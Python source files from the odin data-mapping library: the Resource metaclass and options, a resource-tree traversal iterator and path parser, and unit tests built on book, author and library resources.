META_OPTION_NAMES = (
    'name', 'namespace', 'name_space', 'verbose_name', 'verbose_name_plural', 'abstract', 'doc_group', 'type_field',
    'key_field_name'
)


class ResourceOptions(object):
    def __init__(self, meta):
        self.meta = meta
        self.parents = []
        self.fields = []
        self.virtual_fields = []

        self.name = None
        self.class_name = None
        self.name_space = NOT_PROVIDED
        self.verbose_name = None
        self.verbose_name_plural = None
        self.abstract = False
        self.doc_group = None
        self.type_field = DEFAULT_TYPE_FIELD
        self.key_field_name = None

        self._cache = {}

    def contribute_to_class(self, cls, name):
        cls._meta = self
        self.name = cls.__name__
        self.class_name = ""%s.%s"" % (cls.__module__, cls.__name__)

        if self.meta:
            meta_attrs = self.meta.__dict__.copy()
            for name in self.meta.__dict__:
                if name.startswith('_'):
                    del meta_attrs[name]
            for attr_name in META_OPTION_NAMES:
                if attr_name in meta_attrs:
                    # Allow meta to be defined as namespace
                    if attr_name == 'namespace':
                        setattr(self, 'name_space', meta_attrs.pop(attr_name))
                    else:
                        setattr(self, attr_name, meta_attrs.pop(attr_name))
                elif hasattr(self.meta, attr_name):
                    setattr(self, attr_name, getattr(self.meta, attr_name))

            # Any leftover attributes must be invalid.
            if meta_attrs != {}:
                raise TypeError(""'class Meta' got invalid attribute(s): %s"" % ','.join(meta_attrs.keys()))
        del self.meta

        if not self.verbose_name:
            self.verbose_name = self.name.replace('_', ' ').strip('_ ')
        if not self.verbose_name_plural:
            self.verbose_name_plural = self.verbose_name + 's'

    def add_field(self, field):
        self.fields.append(field)
        cached_property.clear_caches(self)

    def add_virtual_field(self, field):
        self.virtual_fields.append(field)
        cached_property.clear_caches(self)

    def get_key_field(self):
        return self.field_map.get(self.key_field)

    @property
    def resource_name(self):
        """"""
        Full name of resource including namespace (if specified)
        """"""
        if self.name_space:
            return ""%s.%s"" % (self.name_space, self.name)
        else:
            return self.name

    @cached_property
    def all_fields(self):
        """"""
        All fields both standard and virtual.
        """"""
        return self.fields + self.virtual_fields

    @cached_property
    def composite_fields(self):
        """"""
        All composite fields.
        """"""
        # Not the nicest solution but is a fairly safe way of detecting a composite field.
        return [f for f in self.fields if (hasattr(f, 'of') and issubclass(f.of, Resource))]

    @cached_property
    def container_fields(self):
        """"""
        All composite fields with the container flag.

        Used by XML like codecs.

        """"""
        return [f for f in self.composite_fields if getattr(f, 'use_container', False)]

    @cached_property
    def field_map(self):
        return {f.attname: f for f in self.fields}

    @cached_property
    def parent_resource_names(self):
        """"""
        List of parent resource names.
        """"""
        return [p._meta.resource_name for p in self.parents]

    @cached_property
    def attribute_fields(self):
        """"""
        List of fields where is_attribute is True.
        """"""
        return [f for f in self.fields if f.is_attribute]

    @cached_property
    def element_fields(self):
        """"""
        List of fields where is_attribute is False.
        """"""
        return [f for f in self.fields if not f.is_attribute]

    @cached_property
    def element_field_map(self):
        return {f.attname: f for f in self.element_fields}

    @cached_property
    def key_field(self):
        """"""
        Field specified as the key field
        """"""
        return self.field_map.get(self.key_field_name)

    def __repr__(self):
        return '<Options for %s>' % self.resource_name


class ResourceBase(type):
    """"""
    Metaclass for all Resources.
    """"""
    def __new__(cls, name, bases, attrs):
        super_new = super(ResourceBase, cls).__new__

        # attrs will never be empty for classes declared in the standard way
        # (ie. with the `class` keyword). This is quite robust.
        if name == 'NewBase' and attrs == {}:
            return super_new(cls, name, bases, attrs)

        parents = [b for b in bases if isinstance(b, ResourceBase) and not (b.__name__ == 'NewBase'
                                                                            and b.__mro__ == (b, object))]
        if not parents:
            # If this isn't a subclass of Resource, don't do anything special.
            return super_new(cls, name, bases, attrs)

        # Create the class.
        module = attrs.pop('__module__')
        new_class = super_new(cls, name, bases, {'__module__': module})
        attr_meta = attrs.pop('Meta', None)
        abstract = getattr(attr_meta, 'abstract', False)
        if not attr_meta:
            meta = getattr(new_class, 'Meta', None)
        else:
            meta = attr_meta
        base_meta = getattr(new_class, '_meta', None)

        new_class.add_to_class('_meta', ResourceOptions(meta))

        # Generate a namespace if one is not provided
        if new_class._meta.name_space is NOT_PROVIDED and base_meta:
            # Namespace is inherited
            if (not new_class._meta.name_space) or (new_class._meta.name_space is NOT_PROVIDED):
                new_class._meta.name_space = base_meta.name_space

        if new_class._meta.name_space is NOT_PROVIDED:
            new_class._meta.name_space = module

        # Bail out early if we have already created this class.
        r = registration.get_resource(new_class._meta.resource_name)
        if r is not None:
            return r

        # Add all attributes to the class.
        for obj_name, obj in attrs.items():
            new_class.add_to_class(obj_name, obj)

        # Sort the fields
        new_class._meta.fields = sorted(new_class._meta.fields, key=hash)

        # All the fields of any type declared on this model
        local_field_attnames = set([f.attname for f in new_class._meta.fields])
        field_attnames = set(local_field_attnames)

        for base in parents:
            if not hasattr(base, '_meta'):
                # Things without _meta aren't functional models, so they're
                # uninteresting parents.
                continue

            # Check for clashes between locally declared fields and those
            # on the base classes (we cannot handle shadowed fields at the
            # moment).
            for field in base._meta.all_fields:
                if field.attname in local_field_attnames:
                    raise Exception('Local field %r in class %r clashes with field of similar name from '
                                    'base class %r' % (field.attname, name, base.__name__))
            for field in base._meta.fields:
                if field.attname not in field_attnames:
                    field_attnames.add(field.attname)
                    new_class.add_to_class(field.attname, copy.deepcopy(field))
            for field in base._meta.virtual_fields:
                new_class.add_to_class(field.attname, copy.deepcopy(field))

            new_class._meta.parents += base._meta.parents
            new_class._meta.parents.append(base)

        # If a key_field is defined ensure it exists
        if new_class._meta.key_field_name is not None and new_class._meta.key_field is None:
                raise AttributeError('Key field `{}` is not exist on this resource.'.format(
                    new_class._meta.key_field_name)
                )

        if abstract:
            return new_class

        # Register resource
        registration.register_resources(new_class)

        # Because of the way imports happen (recursively), we may or may not be
        # the first time this model tries to register with the framework. There
        # should only be one class for each model, so we always return the
        # registered version.
        return registration.get_resource(new_class._meta.resource_name)

    def add_to_class(cls, name, value):
        if hasattr(value, 'contribute_to_class'):
            value.contribute_to_class(cls, name)
        else:
            setattr(cls, name, value)


@six.add_metaclass(ResourceBase)
class Resource(object):
    def __init__(self, *args, **kwargs):
        args_len = len(args)
        if args_len > len(self._meta.fields):
            raise TypeError('This resource takes %s positional arguments but %s where given.' % (
                len(self._meta.fields), args_len))

        # The ordering of the zip calls matter - zip throws StopIteration
        # when an iter throws it. So if the first iter throws it, the second
        # is *not* consumed. We rely on this, so don't change the order
        # without changing the logic.
        fields_iter = iter(self._meta.fields)
        if args_len:
            if not kwargs:
                for val, field in zip(args, fields_iter):
                    setattr(self, field.attname, val)
            else:
                for val, field in zip(args, fields_iter):
                    setattr(self, field.attname, val)
                    kwargs.pop(field.name, None)

        # Now we're left with the unprocessed fields that *must* come from
        # keywords, or default.
        for field in fields_iter:
            try:
                val = kwargs.pop(field.attname)
            except KeyError:
                val = field.get_default()
            setattr(self, field.attname, val)

        if kwargs:
            raise TypeError(""'%s' is an invalid keyword argument for this function"" % list(kwargs)[0])

    def __repr__(self):
        return '<%s: %s>' % (self.__class__.__name__, self)

    def __str__(self):
        return '%s resource' % self._meta.resource_name

    @classmethod
    def create_from_dict(cls, d, full_clean=False):
        """"""
        Create a resource instance from a dictionary.
        """"""
        return create_resource_from_dict(d, cls, full_clean)

    def to_dict(self, include_virtual=True):
        """"""
        Convert this resource into a `dict` of field_name/value pairs.

        .. note::
            This method is not recursive, it only operates on this single resource, any sub resources are returned as
            is. The use case that prompted the creation of this method is within codecs when a resource must be
            converted into a type that can be serialised, these codecs then operate recursively on the returned `dict`.

        :param include_virtual: Include virtual fields when generating `dict`.

        """"""
        fields = self._meta.all_fields if include_virtual else self._meta.fields
        return dict((f.name, v) for f, v in field_iter_items(self, fields))

    def convert_to(self, to_resource, context=None, ignore_fields=None, **field_values):
        """"""
        Convert this resource into a specified resource.

        A mapping must be defined for conversion between this resource and to_resource or an exception will be raised.

        """"""
        mapping = registration.get_mapping(self.__class__, to_resource)
        ignore_fields = ignore_fields or []
        ignore_fields.extend(mapping.exclude_fields)
        self.full_clean(ignore_fields)
        return mapping(self, context).convert(**field_values)

    def update_existing(self, dest_obj, context=None, ignore_fields=None):
        """"""
        Update the fields on an existing destination object.

        A mapping must be defined for conversion between this resource and ``dest_obj`` type or an exception will be
        raised.

        """"""
        self.full_clean(ignore_fields)
        mapping = registration.get_mapping(self.__class__, dest_obj.__class__)
        return mapping(self, context).update(dest_obj, ignore_fields)

    def extra_attrs(self, attrs):
        """"""
        Called during de-serialisation of data if there are any extra fields defined in the document.

        This allows the resource to decide how to handle these fields. By default they are ignored.
        """"""
        pass

    def clean(self):
        """"""
        Chance to do more in depth validation.
        """"""
        pass

    def full_clean(self, exclude=None):
        """"""
        Calls clean_fields, clean on the resource and raises ``ValidationError``
        for any errors that occurred.
        """"""
        errors = {}

        try:
            self.clean_fields(exclude)
        except ValidationError as e:
            errors = e.update_error_dict(errors)

        try:
            self.clean()
        except ValidationError as e:
            errors = e.update_error_dict(errors)

        if errors:
            raise ValidationError(errors)

    def clean_fields(self, exclude=None):
        errors = {}

        for f in self._meta.fields:
            if exclude and f.name in exclude:
                continue

            raw_value = f.value_from_object(self)

            if f.null and raw_value is None:
                continue

            try:
                raw_value = f.clean(raw_value)
            except ValidationError as e:
                errors[f.name] = e.messages

            # Check for resource level clean methods.
            clean_method = getattr(self, ""clean_%s"" % f.attname, None)
            if callable(clean_method):
                try:
                    raw_value = clean_method(raw_value)
                except ValidationError as e:
                    errors.setdefault(f.name, []).extend(e.messages)

            setattr(self, f.attname, raw_value)

        if errors:
            raise ValidationError(errors)


def resolve_resource_type(resource):
    if isinstance(resource, type) and issubclass(resource, Resource):
        return resource._meta.resource_name, resource._meta.type_field
    else:
        return resource, DEFAULT_TYPE_FIELD


def create_resource_from_dict(d, resource=None, full_clean=True, copy_dict=True):
    """"""
    Create a resource from a dict.

    :param d: dictionary of data.
    :param resource: A resource type, resource name or list of resources and names to use as the base for creating a
        resource. If a list is supplied the first item will be used if a resource type is not supplied; this could also
        be a parent(s) of any resource defined by the dict.
    :param full_clean: Do a full clean as part of the creation.
    :param copy_dict: Use a copy of the input dictionary rather than destructively processing the input dict.

    """"""
    assert isinstance(d, dict)

    if copy_dict:
        d = d.copy()

    if resource:
        resource_type = None

        # Convert to single resource then resolve document type
        if isinstance(resource, (tuple, list)):
            resources = (resolve_resource_type(r) for r in resource)
        else:
            resources = [resolve_resource_type(resource)]

        for resource_name, type_field in resources:
            # See if the input includes a type field  and check it's registered
            document_resource_name = d.get(type_field, None)
            if document_resource_name:
                resource_type = registration.get_resource(document_resource_name)
            else:
                resource_type = registration.get_resource(resource_name)

            if not resource_type:
                raise exceptions.ResourceException(""Resource `%s` is not registered."" % document_resource_name)

            if document_resource_name:
                # Check resource types match or are inherited types
                if (resource_name == document_resource_name or
                        resource_name in resource_type._meta.parent_resource_names):
                    break  # We are done
            else:
                break

        if not resource_type:
            raise exceptions.ResourceException(
                ""Incoming resource does not match [%s]"" % ', '.join(r for r, t in resources))
    else:
        # No resource specified, relay on type field
        document_resource_name = d.pop(DEFAULT_TYPE_FIELD, None)
        if not document_resource_name:
            raise exceptions.ResourceException(""Resource not defined."")

        # Get an instance of a resource type
        resource_type = registration.get_resource(document_resource_name)
        if not resource_type:
            raise exceptions.ResourceException(""Resource `%s` is not registered."" % document_resource_name)

    attrs = []
    errors = {}
    for f in resource_type._meta.fields:
        value = d.pop(f.name, NOT_PROVIDED)
        if value is NOT_PROVIDED:
            value = f.get_default() if f.use_default_if_not_provided else None
        else:
            try:
                value = f.to_python(value)
            except ValidationError as ve:
                errors[f.name] = ve.error_messages
        attrs.append(value)

    if errors:
        raise ValidationError(errors)

    new_resource = resource_type(*attrs)
    if d:
        new_resource.extra_attrs(d)
    if full_clean:
        new_resource.full_clean()
    return new_resource


def build_object_graph(d, resource=None, full_clean=True, copy_dict=True):
    """"""
    Generate an object graph from a dict

    :param resource: A resource type, resource name or list of resources and names to use as the base for creating a
        resource. If a list is supplied the first item will be used if a resource type is not supplied.
    :raises ValidationError: During building of the object graph and issues discovered are raised as a ValidationError.
    """"""

    if isinstance(d, dict):
        return create_resource_from_dict(d, resource, full_clean, copy_dict)

    if isinstance(d, list):
        return [build_object_graph(o, resource, full_clean, copy_dict) for o in d]

    return d


class ResourceIterable(object):
    """"""
    Iterable that yields resources.
    """"""
    def __init__(self, sequence):
        self.sequence = sequence

    def __iter__(self):
        for item in self.sequence:
            yield item
/n/n/nodin/traversal.py/n/n# -*- coding: utf-8 -*-
import six


class NotSupplied(object):
    pass


def _split_atom(atom):
    if '[' in atom:
        field, _, idx = atom.rstrip(']').partition('[')
        return idx, NotSupplied, field
    elif '{' in atom:
        field, _, kv = atom.rstrip('}').partition('{')
        key, _, value = kv.partition('=')
        return value, key, field
    else:
        return NotSupplied, NotSupplied, atom


class TraversalPath(object):
    """"""
    A path through a resource structure.
    """"""
    @classmethod
    def parse(cls, path):
        if isinstance(path, TraversalPath):
            return path
        if isinstance(path, six.string_types):
            return cls(*[_split_atom(a) for a in path.split('.')])

    def __init__(self, *path):
        self._path = path

    def __repr__(self):
        return ""<TraversalPath: %s>"" % self

    def __str__(self):
        atoms = []
        for value, key, field in self._path:
            if value is NotSupplied:
                atoms.append(field)
            elif key is NotSupplied:
                atoms.append(""{}[{}]"".format(field, value))
            else:
                atoms.append(""{}{{{}={}}}"".format(field, key, value))
        return '.'.join(atoms)

    def __hash__(self):
        return hash(self._path)

    def __eq__(self, other):
        if isinstance(other, TraversalPath):
            return hash(self) == hash(other)
        return False

    def __add__(self, other):
        if isinstance(other, TraversalPath):
            return TraversalPath(*(self._path + other._path))

        # Assume appending a field
        if isinstance(other, six.string_types):
            return TraversalPath(*(self._path + tuple([(NotSupplied, NotSupplied, other)])))

        raise TypeError(""Cannot add '%s' to a path."" % other)

    def __iter__(self):
        return iter(self._path)

    def get_value(self, root_resource):
        """"""
        Get a value from a resource structure.
        """"""
        result = root_resource
        for value, key, attr in self:
            field = result._meta.field_map[attr]
            result = field.value_from_object(result)
            if value is NotSupplied:
                continue
            elif key is NotSupplied:
                value = field.key_to_python(value)
                result = result[value]
            else:
                pass
        return result


class ResourceTraversalIterator(object):
    """"""
    Iterator for traversing (walking) a resource structure, including traversing composite fields to fully navigate a
    resource tree.

    This class has hooks that can be used by subclasses to customise the behaviour of the class:

     - *on_enter* - Called after entering a new resource.
     - *on_exit* - Called after exiting a resource.

    """"""
    def __init__(self, resource):
        if isinstance(resource, (list, tuple)):
            # Stack of resource iterators (starts initially with entries from the list)
            self._resource_iters = [iter([(i, r) for i, r in enumerate(resource)])]
        else:
            # Stack of resource iterators (starts initially with single entry of the root resource)
            self._resource_iters = [iter([(None, resource)])]
        # Stack of composite fields, found on each resource, each composite field is interrogated for resources.
        self._field_iters = []
        # The ""path"" to the current resource.
        self._path = [(NotSupplied, NotSupplied, NotSupplied)]
        self._resource_stack = [None]

    def __iter__(self):
        return self

    def __next__(self):
        if self._resource_iters:
            if self._field_iters:
                # Check if the last entry in the field stack has any unprocessed fields.
                if self._field_iters[-1]:
                    # Select the very last field in the field stack.
                    field = self._field_iters[-1][0]
                    # Request a list of resources along with keys from the composite field.
                    self._resource_iters.append(field.item_iter_from_object(self.current_resource))
                    # Update the path
                    self._path.append((NotSupplied, NotSupplied, field.name))
                    self._resource_stack.append(None)
                    # Remove the field from the list (and remove this field entry if it has been emptied)
                    self._field_iters[-1].pop(0)
                else:
                    self._field_iters.pop()

            if self.current_resource:
                if hasattr(self, 'on_exit'):
                    self.on_exit()

            try:
                key, next_resource = next(self._resource_iters[-1])
            except StopIteration:
                # End of the current list of resources pop this list off and get the next list.
                self._path.pop()
                self._resource_iters.pop()
                self._resource_stack.pop()

                return next(self)
            else:
                # If we have a key (ie DictOf, ListOf composite fields) update the path key field.
                if key is not None:
                    _, name, field = self._path[-1]
                    if next_resource._meta.key_field:
                        key = next_resource._meta.key_field.value_from_object(next_resource)
                        name = next_resource._meta.key_field.name
                    self._path[-1] = (key, name, field)

                # Get list of any composite fields for this resource (this is a cached field).
                self._field_iters.append(list(next_resource._meta.composite_fields))

                # self.current_resource = next_resource
                self._resource_stack[-1] = next_resource

                if hasattr(self, 'on_enter'):
                    self.on_enter()
                return next_resource
        else:
            raise StopIteration()

    # Python 2.x compatibility
    next = __next__

    @property
    def path(self):
        """"""
        Path to the current resource node in the tree structure.

        This path can be used to later traverse the tree structure to find get to the specified resource.
        """"""
        # The path is offset by one as the path includes the root to simplify next method.
        return TraversalPath(*self._path[1:])

    @property
    def depth(self):
        """"""
        Depth of the current resource in the tree structure.
        """"""
        return len(self._path) - 1

    @property
    def current_resource(self):
        if self._resource_stack:
            return self._resource_stack[-1]
/n/n/ntests/resources.py/n/n# -*- coding: utf-8 -*-
import odin
from odin.fields.virtual import CalculatedField
from odin.mapping.helpers import sum_fields


class Author(odin.Resource):
    name = odin.StringField()

    class Meta:
        name_space = None


class Publisher(odin.Resource):
    name = odin.StringField()

    class Meta:
        name_space = None


class LibraryBook(odin.Resource):
    class Meta:
        abstract = True
        name_space = ""library""


class Book(LibraryBook):
    class Meta:
        key_field_name = 'isbn'

    title = odin.StringField()
    isbn = odin.StringField()
    num_pages = odin.IntegerField()
    rrp = odin.FloatField(default=20.4, use_default_if_not_provided=True)
    fiction = odin.BooleanField(is_attribute=True)
    genre = odin.StringField(choices=(
        ('sci-fi', 'Science Fiction'),
        ('fantasy', 'Fantasy'),
        ('biography', 'Biography'),
        ('others', 'Others'),
        ('computers-and-tech', 'Computers & technology'),
    ))
    published = odin.TypedArrayField(odin.DateTimeField())
    authors = odin.ArrayOf(Author, use_container=True)
    publisher = odin.DictAs(Publisher, null=True)

    def __eq__(self, other):
        if other:
            return vars(self) == vars(other)
        return False


class Subscriber(odin.Resource):
    name = odin.StringField()
    address = odin.StringField()

    def __eq__(self, other):
        if other:
            return self.name == other.name and self.address == other.address


class Library(odin.Resource):
    name = odin.StringField()
    books = odin.ArrayOf(LibraryBook)
    subscribers = odin.ArrayOf(Subscriber, null=True)
    book_count = CalculatedField(lambda o: len(o.books))

    class Meta:
        name_space = None


class OldBook(LibraryBook):
    name = odin.StringField()
    num_pages = odin.IntegerField()
    price = odin.FloatField()
    genre = odin.StringField(choices=(
        ('sci-fi', 'Science Fiction'),
        ('fantasy', 'Fantasy'),
        ('biography', 'Biography'),
        ('others', 'Others'),
        ('computers-and-tech', 'Computers & technology'),
    ))
    published = odin.DateTimeField()
    author = odin.ObjectAs(Author)
    publisher = odin.ObjectAs(Publisher)


class OldBookToBookMapping(odin.Mapping):
    from_obj = OldBook
    to_obj = Book

    exclude_fields = ('',)

    mappings = (
        ('name', None, 'title'),
    )


class ChildResource(odin.Resource):
    name = odin.StringField()


class FromResource(odin.Resource):
    # Auto matched
    title = odin.StringField()
    count = odin.StringField()
    child = odin.ObjectAs(ChildResource)
    children = odin.ArrayOf(ChildResource)
    # Excluded
    excluded1 = odin.FloatField()
    # Mappings
    from_field1 = odin.StringField()
    from_field2 = odin.StringField()
    from_field3 = odin.IntegerField()
    from_field4 = odin.IntegerField()
    same_but_different = odin.StringField()
    # Custom mappings
    from_field_c1 = odin.StringField()
    from_field_c2 = odin.StringField()
    from_field_c3 = odin.StringField()
    from_field_c4 = odin.StringField()
    not_auto_c5 = odin.StringField()
    comma_separated_string = odin.StringField()
    # Virtual fields
    constant_field = odin.ConstantField(value=10)


class InheritedResource(FromResource):
    # Additional fields
    name = odin.StringField()
    # Additional virtual fields
    calculated_field = odin.CalculatedField(lambda obj: 11)


class MultiInheritedResource(InheritedResource, FromResource):
    pass


class ToResource(odin.Resource):
    # Auto matched
    title = odin.StringField()
    count = odin.IntegerField()
    child = odin.ObjectAs(ChildResource)
    children = odin.ArrayOf(ChildResource)
    # Excluded
    excluded1 = odin.FloatField()
    # Mappings
    to_field1 = odin.StringField()
    to_field2 = odin.IntegerField()
    to_field3 = odin.IntegerField()
    same_but_different = odin.StringField()
    # Custom mappings
    to_field_c1 = odin.StringField()
    to_field_c2 = odin.StringField()
    to_field_c3 = odin.StringField()
    not_auto_c5 = odin.StringField()
    array_string = odin.TypedArrayField(odin.StringField())
    assigned_field = odin.StringField()


class FromToMapping(odin.Mapping):
    from_obj = FromResource
    to_obj = ToResource

    exclude_fields = ('excluded1',)

    mappings = (
        ('from_field1', None, 'to_field1'),
        ('from_field2', int, 'to_field2'),
        (('from_field3', 'from_field4'), sum_fields, 'to_field3'),
        ('from_field1', None, 'same_but_different'),
    )

    @odin.map_field(from_field=('from_field_c1', 'from_field_c2', 'from_field_c3'), to_field='to_field_c1')
    def multi_to_one(self, *values):
        return '-'.join(values)

    @odin.map_field(from_field='from_field_c4', to_field=('to_field_c2', 'to_field_c3'))
    def one_to_multi(self, value):
        return value.split('-', 1)

    @odin.map_field
    def not_auto_c5(self, value):
        return value.upper()

    @odin.map_list_field(to_field='array_string')
    def comma_separated_string(self, value):
        return value.split(',')

    @odin.assign_field
    def assigned_field(self):
        return 'Foo'
/n/n/ntests/test_resource_base.py/n/n# -*- coding: utf-8 -*-
import unittest
import odin
from . import resources


class TestResourceBase(unittest.TestCase):
    def test_virtual_fields(self):
        target = resources.FromResource()

        self.assertEqual(['constant_field'], [f.name for f in target._meta.virtual_fields])

    def test_virtual_field_inheritance(self):
        target = resources.InheritedResource()

        self.assertEqual(['calculated_field', 'constant_field'], [f.name for f in target._meta.virtual_fields])

    def test_fields(self):
        target = resources.FromResource()

        self.assertEqual(['title', 'count', 'child', 'children', 'excluded1', 'from_field1', 'from_field2',
                          'from_field3', 'from_field4', 'same_but_different', 'from_field_c1', 'from_field_c2',
                          'from_field_c3', 'from_field_c4', 'not_auto_c5', 'comma_separated_string'],
                         [f.name for f in target._meta.fields])

    def test_field_inheritance(self):
        target = resources.InheritedResource()

        self.assertEqual(['name', 'title', 'count', 'child', 'children', 'excluded1', 'from_field1', 'from_field2',
                          'from_field3', 'from_field4', 'same_but_different', 'from_field_c1', 'from_field_c2',
                          'from_field_c3', 'from_field_c4', 'not_auto_c5', 'comma_separated_string'],
                         [f.name for f in target._meta.fields])

    def test_field_multi_inheritance(self):
        target = resources.MultiInheritedResource()

        self.assertEqual(['name', 'title', 'count', 'child', 'children', 'excluded1', 'from_field1', 'from_field2',
                          'from_field3', 'from_field4', 'same_but_different', 'from_field_c1', 'from_field_c2',
                          'from_field_c3', 'from_field_c4', 'not_auto_c5', 'comma_separated_string'],
                         [f.name for f in target._meta.fields])

    def test_key_field_does_not_exist(self):
        """"""Ensure an exception is raised if specified key_field is not a member of the resource""""""
        with self.assertRaises(AttributeError):
            class BadResource(odin.Resource):
                class Meta:
                    key_field_name = 'missing_field'

                field_1 = odin.StringField()
/n/n/ntests/test_traversal.py/n/nimport unittest
import odin
from odin import traversal


class Level3(odin.Resource):
    class Meta:
        key_field_name = 'name'
        namespace = 'odin.traversal'

    name = odin.StringField()


class Level2(odin.Resource):
    class Meta:
        namespace = 'odin.traversal'

    name = odin.StringField()
    level3s = odin.ListOf(Level3)


class Level1(odin.Resource):
    class Meta:
        namespace = 'odin.traversal'

    name = odin.StringField()
    level2 = odin.DictAs(Level2)
    level2s = odin.DictOf(Level2)


TEST_STRUCTURE = Level1(
    name='a',
    level2=Level2(name='b', level3s=[]),
    level2s=dict(
        a=Level2(name='c', level3s=[]),
        b=Level2(name='d', level3s=[Level3(name='e'), Level3(name='f')]),
        c=Level2(name='g', level3s=[Level3(name='h')]),
    )
)

TEST_LIST_STRUCTURE = [
    Level1(
        name='a',
        level2=Level2(name='b', level3s=[]),
        level2s=dict(
            a=Level2(name='c', level3s=[]),
            b=Level2(name='d', level3s=[Level3(name='e'), Level3(name='f')]),
            c=Level2(name='g', level3s=[Level3(name='h')]),
        )
    ),
    Level1(
        name='i',
        level2=Level2(name='j', level3s=[]),
        level2s=dict(
            a=Level2(name='k', level3s=[]),
            b=Level2(name='l', level3s=[Level3(name='m'), Level3(name='n')]),
            c=Level2(name='o', level3s=[Level3(name='p')]),
        )
    )
]


class TestResourceTraversalIterator(traversal.ResourceTraversalIterator):
    def __init__(self, resource):
        super(TestResourceTraversalIterator, self).__init__(resource)
        self.events = []

    def on_pre_enter(self):
        self.events.append(""on_pre_enter: %s"" % self.path)

    def on_enter(self):
        self.events.append(""on_enter: %s"" % self.path)

    def on_exit(self):
        self.events.append(""on_exit: %s"" % self.path)


class TraversalTestCase(unittest.TestCase):
    def test_structure(self):
        TEST_STRUCTURE.full_clean()

        resource_iter = TestResourceTraversalIterator(TEST_STRUCTURE)
        resources = [""%s %s %s"" % (r, r.name, resource_iter.depth) for r in resource_iter]

        self.assertListEqual([
            'on_enter: ',
                'on_enter: level2',
                'on_exit: level2',
                'on_enter: level2s[a]',
                'on_exit: level2s[a]',
                'on_enter: level2s[b]',
                    'on_enter: level2s[b].level3s{name=e}',
                    'on_exit: level2s[b].level3s{name=e}',
                    'on_enter: level2s[b].level3s{name=f}',
                    'on_exit: level2s[b].level3s{name=f}',
                'on_exit: level2s[b]',
                'on_enter: level2s[c]',
                'on_enter: level2s[c].level3s{name=h}',
                'on_exit: level2s[c].level3s{name=h}',
                'on_exit: level2s[c]',
            'on_exit: ',
        ], resource_iter.events)

        self.assertListEqual([
            'odin.traversal.Level1 resource a 0',
            'odin.traversal.Level2 resource b 1',
            'odin.traversal.Level2 resource c 1',
            'odin.traversal.Level2 resource d 1',
            'odin.traversal.Level3 resource e 2',
            'odin.traversal.Level3 resource f 2',
            'odin.traversal.Level2 resource g 1',
            'odin.traversal.Level3 resource h 2',
        ], resources)

    def test_list_structure(self):
        TEST_STRUCTURE.full_clean()

        resource_iter = TestResourceTraversalIterator(TEST_LIST_STRUCTURE)
        resources = [""%s %s %s"" % (r, r.name, resource_iter.depth) for r in resource_iter]

        self.assertListEqual([
            'on_enter: ',
                'on_enter: level2',
                'on_exit: level2',
                'on_enter: level2s[a]',
                'on_exit: level2s[a]',
                'on_enter: level2s[b]',
                    'on_enter: level2s[b].level3s{name=e}',
                    'on_exit: level2s[b].level3s{name=e}',
                    'on_enter: level2s[b].level3s{name=f}',
                    'on_exit: level2s[b].level3s{name=f}',
                'on_exit: level2s[b]',
                'on_enter: level2s[c]',
                'on_enter: level2s[c].level3s{name=h}',
                'on_exit: level2s[c].level3s{name=h}',
                'on_exit: level2s[c]',
            'on_exit: ',
            'on_enter: ',
                'on_enter: level2',
                'on_exit: level2',
                'on_enter: level2s[a]',
                'on_exit: level2s[a]',
                'on_enter: level2s[b]',
                    'on_enter: level2s[b].level3s{name=m}',
                    'on_exit: level2s[b].level3s{name=m}',
                    'on_enter: level2s[b].level3s{name=n}',
                    'on_exit: level2s[b].level3s{name=n}',
                'on_exit: level2s[b]',
                'on_enter: level2s[c]',
                'on_enter: level2s[c].level3s{name=p}',
                'on_exit: level2s[c].level3s{name=p}',
                'on_exit: level2s[c]',
            'on_exit: ',
        ], resource_iter.events)

        self.assertListEqual([
            'odin.traversal.Level1 resource a 0',
            'odin.traversal.Level2 resource b 1',
            'odin.traversal.Level2 resource c 1',
            'odin.traversal.Level2 resource d 1',
            'odin.traversal.Level3 resource e 2',
            'odin.traversal.Level3 resource f 2',
            'odin.traversal.Level2 resource g 1',
            'odin.traversal.Level3 resource h 2',
            'odin.traversal.Level1 resource i 0',
            'odin.traversal.Level2 resource j 1',
            'odin.traversal.Level2 resource k 1',
            'odin.traversal.Level2 resource l 1',
            'odin.traversal.Level3 resource m 2',
            'odin.traversal.Level3 resource n 2',
            'odin.traversal.Level2 resource o 1',
            'odin.traversal.Level3 resource p 2',
        ], resources)


class TraversalPathTestCase(unittest.TestCase):
    def test_parse(self):
        actual = traversal.TraversalPath.parse('level2')
        self.assertEqual(traversal.TraversalPath((traversal.NotSupplied, traversal.NotSupplied, 'level2'),), actual)

        actual = traversal.TraversalPath.parse('level2.name')
        self.assertEqual(traversal.TraversalPath(
            (traversal.NotSupplied, traversal.NotSupplied, 'level2'),
            (traversal.NotSupplied, traversal.NotSupplied, 'name')
        ), actual)

        actual = traversal.TraversalPath.parse('level2s[b].level3s[1].name')
        self.assertEqual(traversal.TraversalPath(
            ('b', traversal.NotSupplied, 'level2s'),
            ('1', traversal.NotSupplied, 'level3s'),
            (traversal.NotSupplied, traversal.NotSupplied, 'name')
        ), actual)

        actual = traversal.TraversalPath.parse('level2s[b].level3s{code=abc}.name')
        self.assertEqual(traversal.TraversalPath(
            ('b', traversal.NotSupplied, 'level2s'),
            ('abc', 'code', 'level3s'),
            (traversal.NotSupplied, traversal.NotSupplied, 'name')
        ), actual)

    def test_add(self):
        actual = traversal.TraversalPath.parse('level2') + 'name'
        self.assertEqual(traversal.TraversalPath.parse('level2.name'), actual)

        actual = traversal.TraversalPath.parse('level2s[b]') + traversal.TraversalPath.parse('level3s[1].name')
        self.assertEqual(traversal.TraversalPath.parse('level2s[b].level3s[1].name'), actual)

    def test_valid_path(self):
        self.assertEqual('a', traversal.TraversalPath.parse('name').get_value(TEST_STRUCTURE))
        self.assertEqual('b', traversal.TraversalPath.parse('level2.name').get_value(TEST_STRUCTURE))

        r = traversal.TraversalPath.parse('level2s[b].level3s[1]').get_value(TEST_STRUCTURE)
        self.assertIsInstance(r, Level3)
        self.assertEqual('f', r.name)

        r = traversal.TraversalPath.parse('level2s[d].level3s{name=f}').get_value(TEST_STRUCTURE)
        self.assertIsInstance(r, Level3)
        self.assertEqual('f', r.name)

        r = traversal.TraversalPath.parse('level2s{name=g}.level3s{name=h}').get_value(TEST_STRUCTURE)
        self.assertIsInstance(r, Level3)
        self.assertEqual('h', r.name)

    def test_invalid_path(self):
        path = traversal.TraversalPath.parse('level2s[b].level3s[4]')
        self.assertRaises(IndexError, path.get_value, TEST_STRUCTURE)

        path = traversal.TraversalPath.parse('level2s[b].level3s_sd[1]')
        self.assertRaises(KeyError, path.get_value, TEST_STRUCTURE)

